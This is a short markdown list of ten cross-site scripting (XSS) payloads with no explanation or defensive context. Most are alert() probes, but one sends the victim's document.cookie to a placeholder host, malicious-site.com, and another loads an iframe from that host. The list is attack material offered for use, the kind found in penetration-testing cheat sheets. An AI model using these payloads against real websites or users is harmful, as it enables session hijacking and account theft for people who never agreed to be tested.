
## XSS Payloads

   Payload 1: `<script>alert('XSS');</script>`
   Payload 2: `<img src="x" onerror="alert('XSS');">`
   Payload 3: `<svg onload="alert('XSS');"></svg>`
   Payload 4: `<script>document.location='http://malicious-site.com/collect?data='+document.cookie;</script>`
   Payload 5: `<a href="javascript:alert('XSS');">Click me</a>`
   Payload 6: `<input type="text" value="<script>alert('XSS');</script>">`
   Payload 7: `<iframe src="http://malicious-site.com"></iframe>`
   Payload 8: `<body onload="alert('XSS');">`
   Payload 9: `<div style="background-image: url(javascript:alert('XSS'));">Hello</div>`
   Payload 10: `javascript:alert('XSS')`
